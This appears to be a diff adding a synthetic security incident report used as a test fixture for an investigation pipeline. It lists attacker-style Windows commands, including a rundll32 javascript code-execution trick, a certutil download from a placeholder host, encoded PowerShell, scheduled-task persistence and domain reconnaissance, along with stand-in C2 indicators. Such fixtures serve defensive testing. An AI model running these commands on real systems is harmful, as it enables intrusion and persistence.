@@ -1,0 +1,152 @@
+============================================================
+SYNTHETIC INCIDENT REPORT — FOR TESTING PURPOSES ONLY
+============================================================
+
+Incident ID: INC-2024-0042
+Date: 2024-01-15
+Severity: Medium
+Status: Under Investigation
+Analyst: Test Analyst
+
+============================================================
+EXECUTIVE SUMMARY
+============================================================
+
+On January 15, 2024, the Security Operations Center (SOC) detected
+suspicious activity on multiple workstations within the EXAMPLE.CORP
+domain. The activity involved unusual PowerShell execution, scheduled
+task creation, and potential reconnaissance commands.
+
+This is a SYNTHETIC incident report created for pipeline testing.
+No real systems were compromised.
+
+============================================================
+TIMELINE OF EVENTS
+============================================================
+
+08:23:14 UTC — PowerShell process started on WORKSTATION-01
+  User: DOMAIN\analyst
+  Command: powershell.exe -ExecutionPolicy Bypass -File collect_logs.ps1
+  Assessment: PowerShell was executed with -ExecutionPolicy Bypass flag,
+  which disables script execution restrictions. While this can be used
+  for legitimate administration, it is also commonly used by attackers
+  to run malicious scripts.
+
+08:25:01 UTC — cmd.exe spawned by PowerShell on WORKSTATION-01
+  User: DOMAIN\analyst
+  Command: cmd.exe /c whoami
+  Assessment: The whoami command was executed to determine the current
+  user context. This is a common reconnaissance technique.
+
+08:30:45 UTC — Outbound network connection from PowerShell on WORKSTATION-01
+  Destination: internal-logs.example.corp:443
+  Protocol: TCP/HTTPS
+  Assessment: PowerShell made an outbound connection to an internal server.
+  This could be legitimate log collection or data exfiltration.
+
+09:10:22 UTC — Scheduled task created on WORKSTATION-02
+  User: DOMAIN\admin
+  Command: schtasks /create /tn TestTask /tr test_script.bat /sc daily
+  Assessment: A daily scheduled task was created. This is a common
+  persistence mechanism used by attackers to maintain access.
+
+10:05:17 UTC — Domain user enumeration on SERVER-DC01
+  User: DOMAIN\svc_account
+  Command: net user testuser /domain
+  Assessment: Domain user information was queried from the domain
+  controller. This is a reconnaissance technique for gathering
+  information about domain accounts.
+
+10:45:08 UTC — Encoded PowerShell command on WORKSTATION-03
+  User: DOMAIN\user1
+  Command: powershell.exe -EncodedCommand ZQBjAGgAbwAgAHQAZQBzAHQA
+  Decoded: echo test
+  Assessment: An encoded PowerShell command was executed. Encoding is
+  frequently used to obfuscate malicious commands and evade detection.
+
+11:20:55 UTC — Domain controller enumeration on SERVER-DC01
+  User: DOMAIN\svc_account
+  Command: nltest /dclist:example.corp
+  Assessment: The nltest command was used to list domain controllers.
+  This is a discovery technique used to map the Active Directory
+  infrastructure.
+
+11:30:10 UTC — Suspicious outbound connection from WORKSTATION-03
+  Destination: test-c2-simulation.example.test:8080
+  Protocol: TCP
+  Assessment: PowerShell initiated a connection to an external host
+  on port 8080. This pattern is consistent with command-and-control
+  (C2) communication.
+
+14:00:05 UTC — Suspicious rundll32 execution on WORKSTATION-01
+  User: DOMAIN\analyst
+  Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
+  Assessment: This rundll32 usage pattern is a known technique for
+  executing arbitrary code through the Windows HTML engine.
+
+15:30:00 UTC — Certutil download on WORKSTATION-02
+  User: DOMAIN\admin
+  Command: certutil -urlcache -split -f http://example.test/testfile.txt
+  Assessment: Certutil was used to download a file from the internet.
+  This is a known living-off-the-land binary (LOLBin) technique.
+
+============================================================
+AFFECTED SYSTEMS
+============================================================
+
+- WORKSTATION-01 (192.168.1.100) — DOMAIN\analyst
+- WORKSTATION-02 (192.168.1.101) — DOMAIN\admin
+- WORKSTATION-03 (192.168.1.103) — DOMAIN\user1
+- SERVER-DC01 (10.0.0.10) — DOMAIN\svc_account
+
+============================================================
+INDICATORS OF COMPROMISE (IOC)
+============================================================
+
+Note: All indicators below are SYNTHETIC for testing purposes.
+
+Suspicious Domains:
+- suspicious-example-domain.test
+- test-c2-simulation.example.test
+
+Suspicious IPs:
+- 203.0.113.50 (documentation range — not a real threat)
+- 198.51.100.25 (documentation range — not a real threat)
+
+Suspicious Processes:
+- powershell.exe with -ExecutionPolicy Bypass
+- powershell.exe with -EncodedCommand
+- rundll32.exe with javascript: protocol handler
+- certutil.exe used for file download
+- schtasks.exe creating persistent tasks
+- net.exe querying domain users
+- nltest.exe enumerating domain controllers
+
+MITRE ATT&CK Techniques (Reference Only):
+- T1059.001 — Command and Scripting Interpreter: PowerShell
+- T1053.005 — Scheduled Task/Job: Scheduled Task
+- T1087.002 — Account Discovery: Domain Account
+- T1018 — Remote System Discovery
+- T1105 — Ingress Tool Transfer
+- T1218.011 — Signed Binary Proxy Execution: Rundll32
+
+============================================================
+RECOMMENDATIONS
+============================================================
+
+1. Isolate affected workstations for forensic analysis.
+2. Review PowerShell script execution logs for all flagged hosts.
+3. Check scheduled tasks on WORKSTATION-02 for persistence.
+4. Analyze network traffic to suspicious-example-domain.test.
+5. Verify whether svc_account credentials have been compromised.
+6. Review domain controller logs for additional reconnaissance.
+
+============================================================
+DISCLAIMER
+============================================================
+
+This incident report is entirely SYNTHETIC and was created for
+testing the CyberAI-Investigator pipeline. No real systems were
+compromised, no real attacks were performed, and all IP addresses
+and domain names use reserved/documentation ranges.
+============================================================
